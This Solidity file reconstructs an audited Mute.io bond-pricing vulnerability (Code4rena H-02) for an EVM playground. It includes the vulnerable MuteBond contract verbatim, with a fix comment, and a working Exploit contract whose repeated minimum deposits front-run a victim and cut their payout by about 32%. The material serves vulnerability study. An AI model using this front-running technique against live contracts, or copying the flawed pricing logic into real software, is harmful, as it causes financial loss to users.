// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Mute.Io — attacker can front-run a bond buyer and lower their payout
    (Code4rena 2023-03-mute, finding #16039, H-02)

    Cheatcode-free, single-file reconstruction for the in-browser EVM Playground.
    Unlike a mock, the ENTIRE exploit path is the real audited logic:

      * MuteBond      — contracts/bonds/MuteBond.sol   (VULNERABLE, verbatim)
      * BondTreasury  — contracts/bonds/BondTreasury.sol (whitelist + payout gate)
      * DMute         — contracts/dao/dMute.sol         (payout lock accounting)
      * ERC20         — contracts/test/ERC20Default.sol (real MUTE / LP tokens)
      * SafeMath / TransferHelper / Ownable — real library sources

    The ONLY departure from the audited source is that MuteBond reads a `clock`
    state variable instead of `block.timestamp`. This is forced by the Playground:
    the recorder replays the constructor AND run() inside a single block with one
    fixed timestamp, so `block.timestamp - epochStart` would always be zero and the
    time-dependent price could never move. The registry Foundry test
    (test/16039-…_exp.sol) runs the byte-identical audited MuteBond with `vm.warp`
    and no clock substitution; it reproduces the exact same numbers.

    The vulnerable line (epochStart advances ~5% after every purchase) is preserved
    verbatim and marked @> VULN. Repeated minimum-size purchases move epochStart
    forward, lowering bondPrice() for the victim's later deposit — a strictly
    smaller MUTE payout than the quote the victim observed.
//////////////////////////////////////////////////////////////////////////*/

// ───────────────────────── real libraries (verbatim) ─────────────────────────

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) { return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { return a - b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) { return a % b; }
}

library TransferHelper {
    function safeApprove(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TransferHelper::safeApprove: approve failed");
    }
    function safeTransfer(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TransferHelper::safeTransfer: transfer failed");
    }
    function safeTransferFrom(address token, address from, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TransferHelper::transferFrom: transferFrom failed");
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function balanceOf(address owner) external view returns (uint);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() { _transferOwnership(_msgSender()); }
    function owner() public view virtual returns (address) { return _owner; }
    modifier onlyOwner() { require(owner() == _msgSender(), "Ownable: caller is not the owner"); _; }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// ─────────── real ERC20 (contracts/test/ERC20Default.sol, MUTE / LP) ───────────

contract ERC20 {
    using SafeMath for uint;
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint public totalSupply;
    mapping(address => uint) public balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    constructor(string memory _name, string memory _symbol, uint _totalSupply) {
        name = _name;
        symbol = _symbol;
        _mint(msg.sender, _totalSupply);
    }
    function _mint(address to, uint value) internal {
        totalSupply = totalSupply.add(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(address(0), to, value);
    }
    function _transfer(address from, address to, uint value) private {
        balanceOf[from] = balanceOf[from].sub(value);
        balanceOf[to] = balanceOf[to].add(value);
        emit Transfer(from, to, value);
    }
    function approve(address spender, uint value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    function transfer(address to, uint value) external returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint value) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint).max) {
            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        }
        _transfer(from, to, value);
        return true;
    }
}

// ─────────── real custom treasury (contracts/bonds/BondTreasury.sol) ───────────

contract BondTreasury is Ownable {
    using SafeMath for uint;
    address public immutable payoutToken;
    mapping(address => bool) public bondContract;

    event BondContractWhitelisted(address bondContract);

    constructor(address _payoutToken) {
        require(_payoutToken != address(0));
        payoutToken = _payoutToken;
    }
    // bond contract receives payout tokens (only whitelisted bonds may pull)
    function sendPayoutTokens(uint _amountPayoutToken) external {
        require(bondContract[msg.sender], "msg.sender is not a bond contract");
        TransferHelper.safeTransfer(payoutToken, msg.sender, _amountPayoutToken);
    }
    function valueOfToken(address _principalTokenAddress, uint _amount) public view returns (uint value_) {
        value_ = _amount.mul(10 ** IERC20(payoutToken).decimals()).div(10 ** IERC20(_principalTokenAddress).decimals());
    }
    function whitelistBondContract(address _bondContract) external onlyOwner {
        bondContract[_bondContract] = true;
        emit BondContractWhitelisted(_bondContract);
    }
}

// ─── real dMute payout accounting (contracts/dao/dMute.sol; LockTo / timeToTokens /
//     GetUnderlyingTokens kept verbatim). The dSoulBound voting-checkpoint + EIP712
//     base is omitted — it is unrelated to the pricing bug and to the payout the
//     victim receives. _mint is reduced to the plain balance/supply update the base
//     would have performed. The registry Foundry test uses the FULL real dMute. ───

contract DMute {
    using SafeMath for uint;
    address public MuteToken;
    uint public totalSupply;
    mapping(address => uint) public balanceOf;

    struct UserLockInfo { uint256 amount; uint256 time; uint256 tokens_minted; }
    mapping(address => UserLockInfo[]) public _userLocks;

    uint private unlocked = 1;
    modifier nonReentrant() {
        require(unlocked == 1, "dMute::ReentrancyGuard: REENTRANT_CALL");
        unlocked = 0;
        _;
        unlocked = 1;
    }

    event LockEvent(address to, uint256 lockAmount, uint256 mintedAmount, uint256 totalTime);

    constructor(address _muteToken) {
        require(_muteToken != address(0), "MuteAmplifier: invalid muteToken");
        MuteToken = _muteToken;
    }

    function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256) {
        uint256 week_time = 1 weeks;
        uint256 max_lock = 52 weeks;
        require(_lock_time >= week_time, "dMute::Lock: INSUFFICIENT_TIME_PARAM");
        require(_lock_time <= max_lock, "dMute::Lock: INSUFFICIENT_TIME_PARAM");
        uint256 base_tokens = _amount.mul(_lock_time.mul(10 ** 18).div(max_lock)).div(10 ** 18);
        return base_tokens;
    }

    function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {
        require(IERC20(MuteToken).balanceOf(msg.sender) >= _amount, "dMute::Lock: INSUFFICIENT_BALANCE");
        // pull the payout MUTE from the bond into the lock contract
        IERC20(MuteToken).transferFrom(msg.sender, address(this), _amount);
        uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);
        require(tokens_to_mint > 0, "dMute::Lock: INSUFFICIENT_TOKENS_MINTED");
        totalSupply = totalSupply.add(tokens_to_mint);
        balanceOf[to] = balanceOf[to].add(tokens_to_mint);
        _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint));
        emit LockEvent(to, _amount, tokens_to_mint, _lock_time);
    }

    // sum of locked underlying MUTE for an account — the depositor's realised payout
    function GetUnderlyingTokens(address account) public view returns (uint256 amount) {
        for (uint256 i; i < _userLocks[account].length; i++) {
            amount = amount.add(_userLocks[account][i].amount);
        }
    }
}

// ─────── real vulnerable bond (contracts/bonds/MuteBond.sol, verbatim except the
//         block.timestamp → clock substitution required by the single-block replay) ───────

contract MuteBond {
    using SafeMath for uint;

    event BondCreated(uint deposit, uint payout, address depositor, uint time);

    address immutable private muteToken;
    address immutable private dMuteToken;
    address immutable private lpToken;
    ITreasury immutable private customTreasury;
    uint public bond_time_lock = 7 days;

    uint public totalPayoutGiven;
    uint public totalDebt;

    uint public epochDuration = 7 days;
    uint public maxPrice;
    uint public startPrice;
    uint public maxPayout;
    uint public epochStart;
    uint public epoch;

    // Playground-only clock (stands in for block.timestamp; see file header).
    uint public clock;

    struct BondTerms { uint bondTotal; uint payoutTotal; uint lastTimestamp; }
    struct Bonds { uint value; uint payout; address depositor; uint timestamp; }
    BondTerms[] public terms;
    Bonds[] public bonds;

    constructor(address _customTreasury, address _lpToken, address _dmuteToken,
                uint _maxPrice, uint _startPrice, uint _maxPayout) {
        require(_customTreasury != address(0) && _lpToken != address(0));
        customTreasury = ITreasury(_customTreasury);
        muteToken = ITreasury(_customTreasury).payoutToken();
        dMuteToken = _dmuteToken;
        lpToken = _lpToken;
        TransferHelper.safeApprove(muteToken, dMuteToken, type(uint256).max);
        require(_maxPrice >= _startPrice, "starting price < min");
        epochStart = clock; // audited: block.timestamp
        maxPrice = _maxPrice;
        startPrice = _startPrice;
        maxPayout = _maxPayout;
        terms.push(BondTerms(0, 0, 0));
    }

    /// @dev Playground-only: advance the synthetic clock (models real elapsed time).
    function advance(uint256 seconds_) external { clock += seconds_; }

    function deposit(uint value, address _depositor, bool max_buy) external returns (uint) {
        uint payout = payoutFor(value);
        if (max_buy == true) {
            value = maxPurchaseAmount();
            payout = maxDeposit();
        } else {
            require(payout >= ((10 ** 18) / 100), "Bond too small");
            require(payout <= maxPayout, "Bond too large");
            require(payout <= maxDeposit(), "Deposit too large");
        }

        totalDebt = totalDebt.add(value);
        totalPayoutGiven = totalPayoutGiven.add(payout);

        customTreasury.sendPayoutTokens(payout);
        TransferHelper.safeTransferFrom(lpToken, msg.sender, address(customTreasury), value);

        emit BondCreated(value, payout, _depositor, clock);

        bonds.push(Bonds(value, payout, _depositor, clock));
        IDMute(dMuteToken).LockTo(payout, bond_time_lock, _depositor);

        terms[epoch].payoutTotal = terms[epoch].payoutTotal + payout;
        terms[epoch].bondTotal = terms[epoch].bondTotal + value;
        terms[epoch].lastTimestamp = clock;

        // adjust price by a ~5% premium of delta
        uint timeElapsed = clock - epochStart;
        epochStart = epochStart.add(timeElapsed.mul(5).div(100)); // @> VULN: front-run purchases move epochStart and lower later payouts
        // FIX: accept a minimum-payout/price argument in deposit and revert if the realised payout is below it.
        if (epochStart >= clock)
            epochStart = clock;

        if (terms[epoch].payoutTotal == maxPayout) {
            terms.push(BondTerms(0, 0, 0));
            epochStart = clock;
            epoch++;
        }

        return payout;
    }

    function bondPrice() public view returns (uint) {
        uint timeElapsed = clock - epochStart;
        uint priceDelta = maxPrice - startPrice;
        if (timeElapsed > epochDuration)
            timeElapsed = epochDuration;
        return timeElapsed.mul(priceDelta).div(epochDuration).add(startPrice);
    }

    function payoutFor(uint _am) public view returns (uint) {
        return bondPrice().mul(_am).div(10 ** 18);
    }

    function maxPurchaseAmount() public view returns (uint) {
        return maxDeposit().mul(10 ** 18).div(bondPrice());
    }

    function maxDeposit() public view returns (uint) {
        return maxPayout.sub(terms[epoch].payoutTotal);
    }
}

interface ITreasury {
    function sendPayoutTokens(uint _amountPayoutToken) external;
    function payoutToken() external view returns (address);
    function owner() external view returns (address);
}

interface IDMute {
    function LockTo(uint256 _amount, uint256 _lock_time, address to) external;
}

// ─────────────────────────────── exploit driver ───────────────────────────────
// CREATE order (Exploit deployer nonces): mute(1), lp(2), treasury(3), dmute(4), bond(5).

contract Exploit {
    ERC20 public mute;         // nonce 1
    ERC20 public lp;           // nonce 2
    BondTreasury public treasury; // nonce 3
    DMute public dmute;        // nonce 4
    MuteBond public bond;      // nonce 5

    // The honest bond buyer whose payout is reduced by the front-run.
    address public constant VICTIM = 0x0000000000000000000000000000000000000B0b;

    uint256 public constant FRONT_RUN_COUNT = 20;
    uint256 public constant VICTIM_VALUE = 10 ether;
    uint256 public constant MIN_PURCHASE_PAYOUT = 0.01 ether;

    uint256 public expectedPrice;
    uint256 public actualPrice;
    uint256 public expectedPayout;
    uint256 public victimPayout;
    uint256 public payoutLoss;

    constructor() {
        mute = new ERC20("Mute.io", "MUTE", 2_000_000 ether);
        lp = new ERC20("MuteSwitch LP", "LP", 1_000_000 ether);
        treasury = new BondTreasury(address(mute));
        dmute = new DMute(address(mute));
        // 100e18 -> 200e18 across one seven-day epoch (the audited deployment params)
        bond = new MuteBond(address(treasury), address(lp), address(dmute), 200 ether, 100 ether, 1_000_000 ether);
    }

    function run() external {
        // Whitelist the bond and fund the treasury with MUTE so it can pay out.
        treasury.whitelistBondContract(address(bond));
        mute.transfer(address(treasury), 1_000_000 ether);
        // This contract is the LP payer for every deposit; approve the bond to pull LP.
        lp.approve(address(bond), type(uint256).max);

        // One epoch elapses so the bond reaches its maximum price — the quote the
        // victim observes when broadcasting their purchase.
        bond.advance(7 days);
        expectedPrice = bond.bondPrice();          // 200e18
        expectedPayout = bond.payoutFor(VICTIM_VALUE); // 2000e18
        require(expectedPrice == 200 ether, "expected max price");

        // Front-run: twenty minimum-size purchases. Each real deposit advances
        // epochStart ~5%, pushing bondPrice() down before the victim's tx lands.
        uint256 minPurchaseValue = (MIN_PURCHASE_PAYOUT * 1e18) / bond.startPrice() + 1;
        for (uint256 i = 0; i < FRONT_RUN_COUNT; i++) {
            bond.deposit(minPurchaseValue, address(this), false);
        }

        actualPrice = bond.bondPrice();            // ~135.85e18
        uint256 payoutAtExecution = bond.payoutFor(VICTIM_VALUE);

        // Victim's purchase executes at the front-run (lower) price; payout is
        // locked to the victim in the real dMute accounting.
        victimPayout = bond.deposit(VICTIM_VALUE, VICTIM, false);
        payoutLoss = expectedPayout - victimPayout;

        // HARM: the victim's realised payout is ~32% below the observed quote.
        require(actualPrice * 100 <= expectedPrice * 70, "price not front-run lower");
        require(victimPayout == payoutAtExecution, "payout mismatch");
        require(victimPayout < expectedPayout, "payout not reduced");
        require(dmute.GetUnderlyingTokens(VICTIM) == victimPayout, "dMute underlying mismatch");
        require(payoutLoss > 0, "no victim loss");
    }
}
